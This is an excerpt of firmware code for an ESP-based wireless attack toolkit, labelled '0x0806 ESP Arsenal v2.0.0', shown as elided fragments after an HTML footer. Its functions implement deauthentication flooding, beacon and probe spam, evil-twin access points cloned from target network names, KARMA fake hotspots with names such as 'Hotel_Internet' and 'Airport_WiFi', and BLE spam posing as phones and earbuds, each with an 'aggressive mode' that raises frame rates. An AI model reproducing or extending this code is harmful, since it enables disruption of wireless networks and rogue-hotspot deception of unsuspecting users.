...
<body>
    ...
    <div class="container">
        ...
        <div class="footer">
            <h3 style="color: var(--accent-green); margin-bottom: 1rem;">0x0806 ESP Arsenal v2.0.0</h3>
...
void performDeauthAttack() {
  ...
  unsigned long interval = aggressiveMode ? 10 : 25; // Much faster intervals
  ...
  if (millis() - lastDeauth > interval) {
    ...
    // Send multiple deauth frames per cycle for intensity
    int framesPerCycle = aggressiveMode ? 5 : 3;
...
void performBeaconSpam() {
  ...
  if (millis() - lastBeacon > 50) { // Much faster beacon spam
    lastBeacon = millis();
    
    // Send multiple beacons per cycle for maximum intensity
    int beaconsPerCycle = aggressiveMode ? 8 : 5;
    
    for (int i = 0; i < beaconsPerCycle; i++) {
      // Get fake SSID
      String fakeSSID = fake_ssids[ssidIndex % (sizeof(fake_ssids) / sizeof(fake_ssids[0]))];
      
      // Send beacon frame on random channel
...
void performProbeAttack() {
  ...
  if (millis() - lastProbe > 75) { // Much faster probe attacks
    lastProbe = millis();
    
    // Send multiple probe requests per cycle
    int probesPerCycle = aggressiveMode ? 6 : 4;
    
    for (int p = 0; p < probesPerCycle; p++) {
...
void performEvilTwin() {
  ...
  if (millis() - lastTwin > 100) { // Much faster evil twin creation
    lastTwin = millis();
    ...
    if (!targets.empty()) {
      // Create multiple evil twins per cycle
      int twinsPerCycle = aggressiveMode ? 4 : 3;
      
      for (int t = 0; t < twinsPerCycle; t++) {
        int targetIdx = targets[twinIndex % targets.size()];
        WiFiNetwork& target = networks[targetIdx];
        
        // Create various evil twin variations
        String evilSSID;
        switch(t % 4) {
          case 0: evilSSID = target.ssid + "_Free"; break;
          case 1: evilSSID = target.ssid + "_Guest"; break;
          case 2: evilSSID = target.ssid + "_Open"; break;
          case 3: evilSSID = "Free_" + target.ssid; break;
        }
...
void performKarmaAttack() {
  ...
  if (millis() - lastKarma > 80) { // Much faster KARMA attacks
    lastKarma = millis();
    
    // Send multiple KARMA beacons per cycle
    int karmaPerCycle = aggressiveMode ? 7 : 5;
    
    for (int k = 0; k < karmaPerCycle; k++) {
      String karmaSSID;
      
      // Create diverse KARMA SSIDs
      switch(karmaIndex % 8) {
        case 0: karmaSSID = "FreeWiFi_" + String(karmaIndex % 100); break;
        case 1: karmaSSID = "Guest_Network_" + String(karmaIndex % 50); break;
        case 2: karmaSSID = "Public_WiFi_" + String(karmaIndex % 30); break;
        case 3: karmaSSID = "Hotel_Internet_" + String(karmaIndex % 20); break;
        case 4: karmaSSID = "Coffee_Shop_" + String(karmaIndex % 15); break;
        case 5: karmaSSID = "Airport_WiFi_" + String(karmaIndex % 10); break;
        case 6: karmaSSID = "Mall_Free_" + String(karmaIndex % 25); break;
        case 7: karmaSSID = "Library_Net_" + String(karmaIndex % 12); break;
      }
...
void performBLESpam() {
  ...
  if (millis() - lastBLESpam > 30) { // Much faster BLE spam
    lastBLESpam = millis();
    
    // Send multiple BLE advertisements per cycle
    int blePerCycle = aggressiveMode ? 5 : 3;
    
    for (int b = 0; b < blePerCycle; b++) {
      // Create diverse fake BLE devices
      String deviceName;
      switch(bleIndex % 10) {
        case 0: deviceName = "iPhone_" + String(bleIndex % 50); break;
        case 1: deviceName = "Samsung_" + String(bleIndex % 40); break;
        case 2: deviceName = "AirPods_" + String(bleIndex % 30); break;
        case 3: deviceName = "Headphones_" + String(bleIndex % 25); break;
        case 4: deviceName = "Keyboard_" + String(bleIndex % 20); break;
        case 5: deviceName = "Mouse_" + String(bleIndex % 15); break;
        case 6: deviceName = "Watch_" + String(bleIndex % 35); break;
        case 7: deviceName = "Tablet_" + String(bleIndex % 18); break;
        case 8: deviceName = "Speaker_" + String(bleIndex % 22); break;
        case 9: deviceName = "Fitness_" + String(bleIndex % 12); break;
      }
